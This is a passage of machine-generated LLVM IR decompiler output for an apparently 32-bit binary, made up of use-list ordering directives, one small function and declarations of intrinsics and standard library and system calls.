  uselistorder i32 -1, { 13, 14, 80, 81, 33, 82, 11, 34, 83, 35, 84, 36, 85, 37, 86, 38, 87, 39, 88, 40, 89, 41, 90, 42, 91, 0, 15, 1, 92, 32, 43, 93, 44, 94, 45, 95, 63, 96, 74, 97, 138, 7, 8, 98, 6, 99, 16, 135, 136, 18, 19, 12, 10, 20, 46, 21, 100, 17, 137, 4, 101, 102, 2, 47, 134, 103, 48, 104, 49, 105, 30, 31, 106, 50, 107, 51, 108, 52, 109, 53, 110, 54, 111, 55, 112, 56, 113, 57, 114, 58, 115, 59, 116, 60, 117, 61, 118, 62, 119, 24, 22, 23, 64, 5, 25, 26, 75, 76, 133, 132, 120, 77, 121, 9, 122, 123, 124, 27, 125, 72, 73, 71, 28, 65, 66, 67, 68, 69, 70, 29, 126, 127, 128, 129, 130, 131, 3, 78, 79 }
  uselistorder i32 1, { 176, 177, 76, 109, 110, 332, 0, 333, 111, 392, 393, 394, 37, 35, 38, 36, 178, 48, 179, 50, 180, 86, 181, 95, 182, 79, 183, 81, 184, 7, 185, 8, 186, 39, 188, 187, 77, 189, 193, 192, 191, 190, 75, 397, 398, 399, 196, 195, 194, 41, 42, 40, 112, 197, 199, 198, 80, 113, 168, 292, 395, 201, 200, 64, 62, 63, 132, 202, 203, 43, 44, 294, 98, 129, 295, 172, 204, 12, 11, 9, 10, 205, 17, 15, 13, 14, 19, 18, 16, 29, 26, 28, 30, 25, 27, 133, 206, 134, 207, 135, 208, 136, 210, 209, 169, 213, 212, 211, 94, 137, 344, 345, 346, 214, 66, 67, 347, 348, 114, 349, 350, 351, 33, 31, 32, 102, 343, 138, 87, 88, 89, 90, 140, 352, 353, 354, 355, 356, 357, 358, 359, 360, 139, 361, 362, 363, 364, 365, 115, 366, 367, 96, 116, 368, 369, 370, 371, 117, 118, 372, 373, 374, 217, 216, 215, 52, 54, 55, 53, 56, 119, 120, 218, 141, 170, 219, 220, 221, 222, 223, 224, 227, 226, 225, 34, 228, 323, 324, 325, 326, 327, 328, 329, 142, 143, 100, 101, 229, 4, 3, 5, 144, 145, 146, 230, 46, 45, 47, 231, 59, 58, 396, 233, 232, 91, 92, 121, 400, 234, 93, 236, 235, 22, 237, 23, 238, 24, 239, 61, 240, 6, 241, 69, 71, 243, 242, 70, 244, 72, 245, 74, 247, 246, 82, 248, 249, 73, 250, 78, 251, 57, 252, 68, 51, 304, 296, 297, 298, 104, 299, 300, 301, 302, 303, 305, 258, 257, 256, 255, 254, 253, 85, 83, 84, 163, 293, 259, 306, 20, 21, 147, 260, 122, 150, 307, 130, 148, 149, 308, 309, 263, 262, 261, 99, 310, 311, 151, 123, 124, 312, 265, 264, 313, 314, 125, 152, 153, 315, 316, 271, 270, 269, 268, 267, 266, 317, 318, 105, 126, 319, 154, 155, 320, 321, 273, 272, 173, 65, 322, 274, 106, 330, 276, 275, 331, 277, 164, 334, 335, 165, 336, 337, 166, 167, 338, 339, 340, 107, 341, 127, 156, 280, 279, 278, 157, 108, 158, 342, 281, 282, 1, 284, 283, 285, 375, 376, 377, 378, 379, 97, 380, 287, 286, 49, 159, 2, 289, 288, 174, 160, 381, 131, 382, 383, 161, 384, 103, 385, 386, 162, 128, 171, 387, 175, 388, 389, 390, 391, 60, 291, 290 }
  uselistorder label %dec_label_pc_8052346, { 1, 0 }
}

define i32 @function_8052358() local_unnamed_addr {
entry:
  %v0_805235b = load i32, i32* @ebx, align 4
  %v1_805235c = call i32 @function_80480b0(i32 %v0_805235b)
  store i32 %v1_805235c, i32* @eax, align 4
  %v0_8052367 = call i32 @function_80480c0()
  ret i32 %v0_8052367

; uselistorder directives
  uselistorder i32* @eax, { 6, 48, 36, 50, 51, 52, 53, 55, 8, 56, 0, 54, 3, 5, 49, 9, 7, 10, 11, 14, 12, 37, 39, 40, 38, 41, 42, 44, 45, 43, 1, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 31, 28, 29, 30, 32, 33, 34, 35, 57, 46, 47, 2, 4 }
  uselistorder i32 (i32)* @function_80480b0, { 1, 0 }
  uselistorder i32 0, { 66, 250, 67, 365, 366, 8, 367, 368, 369, 9, 68, 42, 439, 440, 441, 442, 53, 108, 377, 392, 393, 394, 157, 395, 396, 444, 269, 445, 446, 447, 448, 267, 449, 397, 398, 45, 46, 450, 125, 461, 462, 10, 69, 251, 11, 252, 253, 472, 476, 109, 477, 70, 237, 158, 159, 0, 451, 452, 453, 71, 268, 246, 454, 455, 72, 254, 460, 73, 74, 255, 270, 256, 271, 75, 257, 76, 258, 272, 110, 273, 274, 275, 1, 259, 346, 160, 276, 277, 278, 279, 260, 77, 463, 31, 238, 78, 126, 465, 468, 467, 29, 30, 401, 402, 403, 404, 405, 127, 406, 407, 408, 47, 48, 49, 50, 399, 161, 400, 162, 261, 262, 163, 239, 263, 164, 240, 79, 264, 409, 410, 80, 81, 165, 241, 64, 411, 412, 413, 82, 83, 166, 242, 63, 414, 111, 415, 59, 416, 417, 419, 265, 418, 2, 280, 3, 466, 4, 128, 378, 379, 380, 370, 129, 473, 475, 12, 13, 14, 27, 130, 131, 456, 457, 112, 459, 458, 32, 167, 443, 322, 464, 356, 376, 383, 469, 132, 437, 474, 384, 438, 385, 351, 386, 387, 470, 471, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 323, 324, 325, 326, 327, 243, 328, 329, 244, 145, 330, 331, 332, 333, 141, 55, 142, 56, 143, 57, 334, 144, 58, 335, 168, 336, 337, 44, 28, 338, 43, 113, 169, 339, 340, 341, 133, 342, 33, 343, 344, 345, 106, 65, 114, 115, 116, 117, 245, 170, 84, 85, 86, 87, 347, 349, 350, 51, 88, 52, 89, 90, 91, 146, 348, 15, 16, 35, 34, 5, 171, 172, 134, 6, 135, 248, 173, 352, 92, 93, 94, 95, 136, 353, 96, 97, 147, 354, 355, 98, 17, 357, 358, 359, 247, 99, 18, 36, 37, 38, 39, 100, 149, 360, 101, 148, 361, 119, 118, 107, 19, 362, 137, 20, 40, 174, 54, 364, 138, 363, 176, 177, 41, 175, 178, 179, 371, 372, 154, 373, 374, 60, 375, 21, 155, 120, 249, 381, 102, 103, 180, 382, 104, 139, 388, 389, 390, 391, 140, 61, 420, 421, 422, 181, 182, 423, 22, 23, 121, 150, 151, 424, 425, 426, 427, 122, 152, 428, 429, 430, 431, 24, 25, 123, 432, 156, 62, 26, 433, 434, 153, 7, 435, 436, 105, 266, 124, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 478, 479, 480, 481, 482, 483, 484, 485 }
  uselistorder i32* @ebx, { 15, 118, 119, 179, 180, 0, 181, 182, 185, 186, 108, 109, 120, 1, 121, 122, 123, 187, 188, 189, 190, 191, 192, 193, 16, 194, 124, 125, 126, 127, 195, 196, 197, 13, 14, 223, 224, 225, 226, 10, 2, 7, 207, 217, 221, 222, 198, 199, 200, 206, 18, 23, 24, 25, 26, 27, 19, 20, 21, 8, 22, 86, 87, 29, 17, 28, 30, 88, 89, 90, 213, 214, 31, 32, 33, 34, 128, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 3, 143, 144, 129, 130, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 11, 156, 157, 158, 159, 160, 4, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 211, 212, 227, 228, 229, 230, 231, 232, 233, 236, 237, 201, 5, 202, 203, 204, 12, 6, 9, 205, 238, 239, 240, 241, 242, 183, 184, 69, 70, 209, 210, 98, 99, 106, 107, 110, 111, 215, 216, 175, 176, 234, 235, 112, 113, 177, 178, 94, 95, 114, 115, 116, 117, 208, 218, 219, 220, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 91, 92, 93, 96, 97, 100, 101, 102, 103, 104, 105, 171, 172, 173, 174 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i32 @_strlen(i8*) local_unnamed_addr

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @vfork() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @dup2(i32, i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32* @mmap(i32*, i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @munmap(i32*, i32) local_unnamed_addr

declare i32 @wait4(i32, i32, i32, %rusage*) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

declare i64 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16 @__decompiler_undefined_function_4() local_unnamed_addr

declare i16* @__decompiler_undefined_function_5() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_6() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_7() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_8() local_unnamed_addr

declare %rusage* @__decompiler_undefined_function_9() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
